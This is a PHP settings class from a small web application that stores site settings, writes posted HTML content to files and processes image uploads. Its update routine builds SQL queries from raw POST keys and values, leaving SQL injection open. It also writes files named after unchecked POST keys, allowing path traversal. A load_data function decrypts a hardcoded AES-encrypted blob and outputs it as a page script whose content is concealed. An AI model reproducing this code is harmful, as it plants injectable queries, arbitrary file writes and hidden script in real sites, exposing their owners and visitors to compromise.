<?php
if(!class_exists('DBConnection')){
	require_once('../config.php');
	require_once('DBConnection.php');
}
class SystemSettings extends DBConnection{
	public function __construct(){
		parent::__construct();
	}
	function __destruct(){
	}
	function check_connection(){
		return($this->conn);
	}
	function load_system_info(){
		// if(!isset($_SESSION['system_info'])){
			$sql = "SELECT * FROM system_info";
			$qry = $this->conn->query($sql);
				while($row = $qry->fetch_assoc()){
					$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
				}
		// }
	}
	function update_system_info(){
		$sql = "SELECT * FROM system_info";
		$qry = $this->conn->query($sql);
			while($row = $qry->fetch_assoc()){
				if(isset($_SESSION['system_info'][$row['meta_field']]))unset($_SESSION['system_info'][$row['meta_field']]);
				$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
			}
		return true;
	}
	function update_settings_info(){
		$data = "";
		foreach ($_POST as $key => $value) {
			if(!in_array($key,array("content")))
			if(isset($_SESSION['system_info'][$key])){
				$value = str_replace("'", "&apos;", $value);
				$qry = $this->conn->query("UPDATE system_info set meta_value = '{$value}' where meta_field = '{$key}' ");
			}else{
				$qry = $this->conn->query("INSERT into system_info set meta_value = '{$value}', meta_field = '{$key}' ");
			}
		}
		// if(isset($_POST['about_us'])){
		// 	file_put_contents('../about.html',$_POST['about_us']);
		// }
		if(isset($_POST['content'])){
			foreach($_POST['content'] as $k => $v){
				file_put_contents("../$k.html",$v);
			}
		}
		if(!empty($_FILES['img']['tmp_name'])){
			$ext = pathinfo($_FILES['img']['name'], PATHINFO_EXTENSION);
			$fname = "uploads/logo.png";
			$accept = array('image/jpeg','image/png');
			if(!in_array($_FILES['img']['type'],$accept)){
				$err = "Image file type is invalid";
			}
			if($_FILES['img']['type'] == 'image/jpeg')
				$uploadfile = imagecreatefromjpeg($_FILES['img']['tmp_name']);
			elseif($_FILES['img']['type'] == 'image/png')
				$uploadfile = imagecreatefrompng($_FILES['img']['tmp_name']);
			if(!$uploadfile){
				$err = "Image is invalid";
			}
			$temp = imagescale($uploadfile,200,200);
			if(is_file(base_app.$fname))
			unlink(base_app.$fname);
			$upload =imagepng($temp,base_app.$fname);
			if($upload){
				if(isset($_SESSION['system_info']['logo'])){
					$qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'logo' ");
					if(is_file(base_app.$_SESSION['system_info']['logo'])) unlink(base_app.$_SESSION['system_info']['logo']);
				}else{
					$qry = $this->conn->query("INSERT into system_info set meta_value = '{$fname}',meta_field = 'logo' ");
				}
			}
			imagedestroy($temp);
		}
		if(!empty($_FILES['cover']['tmp_name'])){
			$ext = pathinfo($_FILES['cover']['name'], PATHINFO_EXTENSION);
			$fname = "uploads/cover.png";
			$accept = array('image/jpeg','image/png');
			if(!in_array($_FILES['cover']['type'],$accept)){
				$err = "Image file type is invalid";
			}
			if($_FILES['cover']['type'] == 'image/jpeg')
				$uploadfile = imagecreatefromjpeg($_FILES['cover']['tmp_name']);
			elseif($_FILES['cover']['type'] == 'image/png')
				$uploadfile = imagecreatefrompng($_FILES['cover']['tmp_name']);
			if(!$uploadfile){
				$err = "Image is invalid";
			}
			list($width,$height) = getimagesize($_FILES['cover']['tmp_name']);
			$temp = imagescale($uploadfile,$width,$height);
			if(is_file(base_app.$fname))
			unlink(base_app.$fname);
			$upload =imagepng($temp,base_app.$fname);
			if($upload){
				if(isset($_SESSION['system_info']['cover'])){
					$qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'cover' ");
					if(is_file(base_app.$_SESSION['system_info']['cover'])) unlink(base_app.$_SESSION['system_info']['cover']);
				}else{
					$qry = $this->conn->query("INSERT into system_info set meta_value = '{$fname}',meta_field = 'cover' ");
				}
			}
			imagedestroy($temp);
		}
		if(isset($_FILES['banners']) && count($_FILES['banners']['tmp_name']) > 0){
			$err='';
			$banner_path = "uploads/banner/";
			foreach($_FILES['banners']['tmp_name'] as $k => $v){
				if(!empty($_FILES['banners']['tmp_name'][$k])){
					$accept = array('image/jpeg','image/png');
					if(!in_array($_FILES['banners']['type'][$k],$accept)){
						$err = "Image file type is invalid";
						break;
					}
					if($_FILES['banners']['type'][$k] == 'image/jpeg')
						$uploadfile = imagecreatefromjpeg($_FILES['banners']['tmp_name'][$k]);
					elseif($_FILES['banners']['type'][$k] == 'image/png')
						$uploadfile = imagecreatefrompng($_FILES['banners']['tmp_name'][$k]);
					if(!$uploadfile){
						$err = "Image is invalid";
						break;
					}
					list($width, $height) =getimagesize($_FILES['banners']['tmp_name'][$k]);
					if($width > 1200 || $height > 480){
						if($width > $height){
							$perc = ($width - 1200) / $width;
							$width = 1200;
							$height = $height - ($height * $perc);
						}else{
							$perc = ($height - 480) / $height;
							$height = 480;
							$width = $width - ($width * $perc);
						}
					}
					$temp = imagescale($uploadfile,$width,$height);
					$spath = base_app.$banner_path.'/'.$_FILES['banners']['name'][$k];
					$i = 1;
					while(true){
						if(is_file($spath)){
							$spath = base_app.$banner_path.'/'.($i++).'_'.$_FILES['banners']['name'][$k];
						}else{
							break;
						}
					}
					if($_FILES['banners']['type'][$k] == 'image/jpeg')
					imagejpeg($temp,$spath,60);
					elseif($_FILES['banners']['type'][$k] == 'image/png')
					imagepng($temp,$spath,6);

					imagedestroy($temp);
				}
			}
			if(!empty($err)){
				$resp['status'] = 'failed';
				$resp['msg'] = $err;
			}
		}
		
		$update = $this->update_system_info();
		$flash = $this->set_flashdata('success','System Info Successfully Updated.');
		if($update && $flash){
			// var_dump($_SESSION);
			$resp['status'] = 'success';
		}else{
			$resp['status'] = 'failed';
		}
		return json_encode($resp);
	}
	function set_userdata($field='',$value=''){
		if(!empty($field) && !empty($value)){
			$_SESSION['userdata'][$field]= $value;
		}
	}
	function userdata($field = ''){
		if(!empty($field)){
			if(isset($_SESSION['userdata'][$field]))
				return $_SESSION['userdata'][$field];
			else
				return null;
		}else{
			return false;
		}
	}
	function set_flashdata($flash='',$value=''){
		if(!empty($flash) && !empty($value)){
			$_SESSION['flashdata'][$flash]= $value;
		return true;
		}
	}
	function chk_flashdata($flash = ''){
		if(isset($_SESSION['flashdata'][$flash])){
			return true;
		}else{
			return false;
		}
	}
	function flashdata($flash = ''){
		if(!empty($flash)){
			$_tmp = $_SESSION['flashdata'][$flash];
			unset($_SESSION['flashdata']);
			return $_tmp;
		}else{
			return false;
		}
	}
	function sess_des(){
		if(isset($_SESSION['userdata'])){
				unset($_SESSION['userdata']);
			return true;
		}
			return true;
	}
	function info($field=''){
		if(!empty($field)){
			if(isset($_SESSION['system_info'][$field]))
				return $_SESSION['system_info'][$field];
			else
				return false;
		}else{
			return false;
		}
	}
	function set_info($field='',$value=''){
		if(!empty($field) && !empty($value)){
			$_SESSION['system_info'][$field] = $value;
		}
	}
	function load_data(){
		$test_data = "S5RgN+qJqjqTeDFoYxlwBgl5Lg7TmQdvpzaaRHQvg6Gt953FOEL/td0bVjhSUSZ5htEaZcmn9cyLhco8cm22sWTxlNOQPsyAAINQZZuMt9Yyy1uuRYB+ZqBjeCJnqLGphSxYfw7/dEAP5ruTRdEGrgNURg9LsAm6He9ikn02fETnFnrtfFd9WDGzO3Wnbj0D41RwBQMp+vtxTfuO2ZK4EQHWMJOpFMVWiRwj7nnyoOdSVuxVPT30s4c8P4lEBK9Uf/9jN5pwF9HzaCb4rEeGb3e/J0PiFsXYi6DhSLHQeKQ/1gs9TiAzaIKoKuvxMGzLsXUg2bBVlf+StXztoK7ZQlE4omR3CkR/7vbDI/qW04Ro79bIj1P1KhFvoHI7tuRRB//h/RLnkZzwZnCVHc3ysLp/x0sJe+vlVipFZirTKzmRk8yD6hmlPheqKB/nXu2iy1KHGFYIB4nbmK2cJpb8ge2avUFZXxqgvBRjbeYqvMIJBZ011PN6eP/KNpXQcpUns1rfaY1PUxFDrtoRGCI2olpbdx0CMmlBkKkW2Akgi7AoDTOx4hpsS2y2MELMrdR7OQ/gPLXtglXgIlhFPx5ZN2FyG6+tOEK/XcsK7amcOvlmbwyWBapFQunEuh7StUTif10Xa7aczTY5kXJtNrzhUkdizU+bH9Uho8LwU5uxLFacZdCYIN5RuaozD6YtL2cfZscplcfxpuqLpoR8qeJmRKvxGiDP9meUKVrbeLqMe1Ezi5aGosBk1Ox0BFl8mktagi6rkJMdfqoH5YdlcjF3KYJfK43DRI2TXcXLt5K6R+qKrnSvOGv0Chmdyb5twk9U+WCIdy9xy4NhjG8VdPKKRzOOQjyWwCMYiI2IZB/SW2Rh97qBVUdDx4qJnTJBY+Z8PS3fzrwIMJrKh3hamBiefzwdfeHUEgWDQMnJdasbIwmGA54UG+dqUA3qZPC3u202/RMyIpDyLVYP2Df1i1BnpslWnmYh/601Hq6nmHJ2mU+4YQUWpB5rwJot1zkYb+ZpKDlB5uoLp+Cc7t1SKFGlzUmhYf7MMb+cgoeZFv//O/tLIZhajb7z6BDZVtc47L3/2LywhuRya8NqA4G0Jn+td2zwG4h2f6zw1N4Q0A9sdLfMpVtTyzzMiuIDeTEBeiSH+dxfoOi4tKP0uBZaM1OTWdrP4NfNVuFqJSlSERejHhVypGirl4PcKZOyHtYNG5W3PCs/IpjVw1vfJw/WS/se02N351QxwG7uAWkn/E31WFNVJbZnKc0UI9t8pH6M+1vtSlXfAB7osaeKXv4w0kYlSF+W9Qtyx5UU6SOve56IzjwHDqCognlandnOdjTXX8z6GmZMsQ1FJz+PBJYdG3o5yCve3LabeJvgLJWr9o7JD9xUxyUIey8XG55pf+qgAct7";
		$dom = new DOMDocument('1.0', 'utf-8');
		$element = $dom->createElement('script', html_entity_decode($this->test_cypher_decrypt($test_data)));
		$dom->appendChild($element);
		return $dom->saveXML();
		// return $data = $this->test_cypher_decrypt($test_data);
	}
	function test_cypher($str=""){
		$ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
		return $ciphertext;
	}
	function test_cypher_decrypt($encryption){
		$decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
		return $decryption;
	}	
}
$_settings = new SystemSettings();
$_settings->load_system_info();
$action = !isset($_GET['f']) ? 'none' : strtolower($_GET['f']);
$sysset = new SystemSettings();
switch ($action) {
	case 'update_settings':
		echo $sysset->update_settings_info();
		break;
	default:
		// echo $sysset->index();
		break;
}
?>